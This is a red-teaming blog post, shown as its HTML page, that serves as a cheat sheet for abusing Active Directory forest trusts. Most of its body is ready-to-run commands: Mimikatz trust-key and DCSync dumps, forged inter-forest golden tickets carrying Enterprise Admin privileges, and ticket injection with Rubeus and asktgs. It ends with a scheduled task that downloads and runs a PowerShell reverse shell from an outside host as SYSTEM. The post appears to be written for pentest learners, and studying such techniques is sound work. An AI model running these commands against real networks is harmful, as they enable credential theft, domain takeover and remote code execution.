<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Active Directory - Forest Trust Abuse" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-19T08:38:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory - Forest Trust Abuse" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-04-19T08:38:00+05:30","datePublished":"2022-04-19T08:38:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Active Directory - Forest Trust Abuse","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/"},"url":"https://0xstarlight.github.io/posts/Active-Diretory-Forest-Trust-Abuse/"}</script><title>Active Directory - Forest Trust Abuse | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Active Directory - Forest Trust Abuse</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory - Forest Trust Abuse</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1650337680" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1147 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/163936884-47b7709f-7ab3-45b8-b94e-074702f2fc21.png" alt="forest" data-proofer-ignore></p><h1 id="introduction"><span style="color:lightblue">Introduction</span></h1><p>Welcome to my seventh article in the Red Teaming Series (Active Directory Forest Trust Abuse). I hope everyone has gone through the previous articles of this series which go through the basic concepts required up to Domain Privilege Escalation.</p><p>If not so, you can give it a read from <a href="https://0xstarlight.github.io/categories/red-teaming/">here</a>.</p><p>This guide explains Active-Directory Forest Trust Abuse mainly by forging an inter-forest TGT. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.</p><p>I will continue to update this article with new Forest Trust Abuse Methods.</p><blockquote><h2 id="throughout-the-article-i-will-use-invoke-mimikatz-in-performing-the-forest-trust-abuse-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end"><span class="mr-2">Throughout the article, I will use <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"><span class="mr-2">Invoke-Mimikatz</a> in performing the Forest Trust Abuse on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.</span><a href="#throughout-the-article-i-will-use-invoke-mimikatz-in-performing-the-forest-trust-abuse-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2></blockquote><h1 id="the-working-of-the-forest-trust-flow"><span style="color:lightblue">The working of the forest trust flow</span></h1><p><img data-src="https://user-images.githubusercontent.com/59029171/163977387-61620684-4761-4bca-a242-3b68765aeeb0.png" alt="image" data-proofer-ignore></p><p>Let’s break down every step from the above diagram and understand how the trust flows across forests, mainly focusing on external trusts. A forest is a collection of one or more domain trees inside an Active Directory network. Forest trusts between two domain controllers allow users to access resources in each other’s domains. This can be only possible if the relationship set between them is bi-directional. For example, <code class="language-plaintext highlighter-rouge">starlight.US-access.local</code> has an external bi-directional trust to a forest called <code class="language-plaintext highlighter-rouge">EU-access.local</code>. Hence a user from the starlight domain can access the resources of <code class="language-plaintext highlighter-rouge">EU-access.local</code>.</p><p>We can map the forest trust with the following command using PowerView.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Map all the trusts of the current forest</span><span class="w">
</span><span class="n">Get-NetForestDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-NetDomainTrust</span><span class="w"> 
</span><span class="c"># Extract info from the external forest ( Bi-directional )</span><span class="w">
</span><span class="n">Get-NetForestDomain</span><span class="w"> </span><span class="nt">-Forest</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">external-forest</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-NetDomainTrust</span><span class="w"> </span><span class="nt">-NET</span><span class="w">
</span></pre></table></code></div></div><p>Now you know what forest trust is and know how to identify it, let’s begin with the workflow of the trust flow across the forests.</p><h2 id="1-client-requests-a-tgt-from-dc"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">1. Client Requests a TGT from DC</span></span><a href="#1-client-requests-a-tgt-from-dc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The privileged user wants to access a specific service from the application server of a different forest.<li>The user sends a timestamp to the DC, which is encrypted and signed with the NTLM hash of the user’s password.<li>The following is required for the DC to verify if the request is made from the user it claims to be.</ol><h2 id="2-dc-sends-tgt-to-client"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">2. DC sends TGT to Client</span></span><a href="#2-dc-sends-tgt-to-client" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The DC receives and decrypts the encrypted timestamp.<li>The DC ensures the request comes from the user it claims to be and responds with a Ticket Granting Ticket(TGT) which can grant another ticket.<li>The sent TGT is encrypted and signed off with the NTML hash of the KRBTG, which is a particular account of the DC only used for this purpose. This means the TGT can be only read and opened by the KRBTG.</ol><h2 id="3-and-4-client-receives-inter-realm-tgt"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">3. and 4. Client receives inter-realm TGT</span></span><a href="#3-and-4-client-receives-inter-realm-tgt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client receives the TGT, sends it back to the DC and requests a Ticket Granting Service(TGS) service of a <strong>different forest</strong>.<li>Once the DC discovers the work of TGS is to access the services from a different external forest with a bi-directional trust, it resends an inter-realm TGT to the client.</ol><h2 id="5-and-6-client-receives-tgs-from-external-forest"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">5. and 6. Client receives TGS from external forest</span></span><a href="#5-and-6-client-receives-tgs-from-external-forest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client receives the TGT, sends it back to the DC of the external forest and requests a Ticket Granting Service(TGS).<li>The DC receives the TGS, decrypts it and does the following validation.<li>The only validation it does is whether it can decrypt the TGT or not. If possible, it assumes all the content inside the inter-realm TGT is valid.</ol><h2 id="7-and-8-client-sends-service-ticket"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">7. and 8. Client sends service ticket</span></span><a href="#7-and-8-client-sends-service-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client connects to the application server and presents the TGS it received from the external DC for its requested service.<li>It decrypts the TGS and then decides whether the user can access the service or not.</ol><p>These are the steps of how a Trust flow across forest works typically. An attacker can abuse the 5th step from the above steps to gain profit. We can forge an inter-realm TGT as an enterprise administrator for the external forest if we have access to the trust keys.</p><p>In the case of the Domain Trusts, parent-child trusts, we could escalate our privileges to the enterprise administrator using the SID history. But since there is SID filtering in forest and external trusts, we can’t abuse the SID history part.</p><h1 id="trust-key-abuse-by-rc4-hash"><span style="color:lightblue">Trust Key Abuse by rc4 hash</span></h1><h2 id="methodologysteps"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Dump the trust keys of the inter-forest trusts<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Note the SID of the current Domain, SID of the target Domain and the rc4_hmac_nt(Trust Key) of the target Domain.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. We can forge a inter-forest TGT with the proper target and <code class="language-plaintext highlighter-rouge">rc4</code> parameters. Remember to add <code class="language-plaintext highlighter-rouge">-519</code> after the <code class="language-plaintext highlighter-rouge">sids</code> parameter to forge privileges as an Enterprise Administrator.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Now request a TGS using <strong>asktgs.exe</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Now Inject the TGS in the memory<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Now we can access all the shared files admin DC</ul><h2 id="invoke-mimikatz"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-we-require-the-trust-key-of-inter-forest-trust"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. We require the trust key of inter-forest trust</span></span><a href="#1-we-require-the-trust-key-of-inter-forest-trust" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::trust /patch"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-forge-the-inter-forest-tgt"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Forge the inter-forest TGT</span></span><a href="#2-forge-the-inter-forest-tgt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:&lt;current-domain&gt; /sid:&lt;current-domain-SID&gt; /sids:&lt;target-domain-SID&gt;-519 /rc4:&lt;target-domain-rc4-hash&gt; /service:krbtgt /target:&lt;target-domain&gt; /ticket:C:\kekeo_old\trust_tkt.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-now-create-a-tgs-for-a-service-cifs-in-the-parent-domain"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Now create a TGS for a service (CIFS) in the parent domain</span></span><a href="#3-now-create-a-tgs-for-a-service-cifs-in-the-parent-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\kekeo_old\trust_tkt.kirbi</span><span class="w"> </span><span class="nx">CIFS/</span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-present-the-tgs-to-the-target-service"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Present the TGS to the target service</span></span><a href="#4-present-the-tgs-to-the-target-service" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="o">.</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">file.kirbi</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="5-now-try-to-access-the-target-service-cifs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. Now try to access the target service (CIFS)</span></span><a href="#5-now-try-to-access-the-target-service-cifs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="nx">\C</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h1 id="trust-key-abuse-using-rubeus"><span style="color:lightblue">Trust Key Abuse using Rubeus</span></h1><h2 id="invoke-mimikatz-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-create-ticket-and-add-it-into-the-memory-using-asktgs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Create ticket and add it into the memory using asktgs</span></span><a href="#1-create-ticket-and-add-it-into-the-memory-using-asktgs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">/asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\kekeo_old\trust_tkt.kirbi</span><span class="w"> </span><span class="nx">/service:cifs/</span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dc:</span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-list-the-authentications"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. List the authentications</span></span><a href="#2-list-the-authentications" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">klist</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-now-try-to-access-the-target-service-cifs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Now try to access the target service (CIFS)</span></span><a href="#3-now-try-to-access-the-target-service-cifs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="nx">\C</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h1 id="trust-abuse-by-krbtgt-hash"><span style="color:lightblue">Trust Abuse by krbtgt hash</span></h1><h2 id="methodologysteps-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Perform a DCSync attack to dump the KRBTGT hash.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Dump the trust keys of the inter-forest trusts.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Note the SID of the current Domain, SID of the target Domain.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. We can forge a inter-realm TGT using a Golden Ticket. Remember to add <code class="language-plaintext highlighter-rouge">-519</code> after the <code class="language-plaintext highlighter-rouge">sids</code> parameter to forge privileges as an Enterprise Administrator.<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Now Inject the TGS in the memory<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. We can create a schedule and execute a task to get a shell as enterprise admin.</ul><h3 id="1-perform-a-dcsync-attack-for-getting-krbtg-hash-execute-the-below-command-with-dc-privileges"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Perform a DCSync attack for getting krbtg hash. Execute the below command with DC privileges</span></span><a href="#1-perform-a-dcsync-attack-for-getting-krbtg-hash-execute-the-below-command-with-dc-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsyn /domain:&lt;target-domain-SID&gt; /all /cvs"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-create-the-inter-realm-tgt-using-a-golden-ticket"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Create the inter-realm TGT using a Golden Ticket</span></span><a href="#2-create-the-inter-realm-tgt-using-a-golden-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:&lt;current-domain&gt; /sid:&lt;current-domain-SID&gt; /sids:&lt;target-domain-SID&gt;-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\krbtgt_tkt.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-now-inject-the-ticket-with-mimikatz"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Now inject the ticket with Mimikatz</span></span><a href="#3-now-inject-the-ticket-with-mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt C:\krbtgt_tkt.kirbi"'</span><span class="w">
</span><span class="c"># Now we can also execute wmi commands</span><span class="w">
</span><span class="n">gwmi</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_computersystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-create-a-schedule-to-get-a-shell-as-nt-authoritysystem"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Create a schedule to get a shell as NT AUTHORITY\SYSTEM</span></span><a href="#4-create-a-schedule-to-get-a-shell-as-nt-authoritysystem" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT AUTHORITY\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"pwned"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.x.x/Invoke-PowerShellTcp.ps1''')'"</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target-domain-user-dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"pwned"</span><span class="w">
</span></pre></table></code></div></div><h1 id="tools-used"><span style="color:lightblue">Tools Used</span></h1><ol><li>Invoke-Mimikatz.ps1 download from here : <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1</a><li>asktgs_compiled download from here : <a href="https://github.com/NotScortator/asktgs_compiled">https://github.com/NotScortator/asktgs_compiled</a><li>Rubeus.exe download from here : <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/active-directory-forest-trust-abuse/'>Active-Directory-Forest-Trust-Abuse</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/inter-forest-tgt/" class="post-tag no-text-decoration" >inter-forest-TGT</a> <a href="/tags/ticket-abuse/" class="post-tag no-text-decoration" >ticket-abuse</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div 